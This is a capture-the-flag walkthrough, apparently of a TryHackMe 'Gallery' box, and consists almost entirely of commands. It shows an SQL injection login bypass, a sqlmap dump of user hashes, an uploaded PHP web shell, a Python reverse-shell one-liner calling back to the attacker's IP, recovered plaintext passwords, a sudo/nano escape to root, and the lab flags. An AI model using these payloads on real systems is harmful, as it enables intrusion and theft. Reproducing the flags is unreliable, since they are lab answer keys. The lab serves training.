# Gallery 

> VOiD | Saturday 12 February 2022 01:21:45 PM UTC

My IP : 10.8.253.221
Target IP : 10.10.75.116

## PORT 80 [http]
```bash
/gallery

login.php
"admin' or '1'='1'#"

https://www.exploit-db.com/exploits/50198

Database: gallery_db
[4 tables]
+---------------------------------------+
| album_list                            |
| images                                |
| system_info                           |
| users                                 |
+---------------------------------------+

sqlmap -r req  -T users --dump  --batch
Admin    | a228b12a08b6527e7978cbe5d914531c | admin    | Adminstrator


http://10.10.75.116/gallery/uploads/1644674160_TagolfoqkkqklgfsugmLetta.php?cmd=whoami


curl http://10.10.174.38/gallery/uploads/1644675840_TagorhsleqhwqbvzcorLetta.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.253.221",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```



## USER [www-data]
```bash
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");
if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");

```

```bash
-rw-r--r--  1 root root  364 May 20  2021 rootkit.sh
www-data@gallery:/opt$ cat rootkit.sh 
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```

```bash
www-data@gallery:/var/backups/mike_home_backup$ cat .bash_history 
cd ~
ls
ping 1.1.1.1
cat /home/mike/user.txt
cd /var/www/
ls
cd html
ls -al
cat index.html
sudo -l b3stpassw0rdbr0xx

```

## USER [mike]
```bash
mike@gallery:~$ cat user.txt 
THM{af05cd30bfed67849befd546ef}

User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh


sudo /bin/bash /opt/rootkit.sh

read

nano
^R^X
reset; sh 1>&0 2>&0

root@gallery:/root# cat root.txt 
THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}

```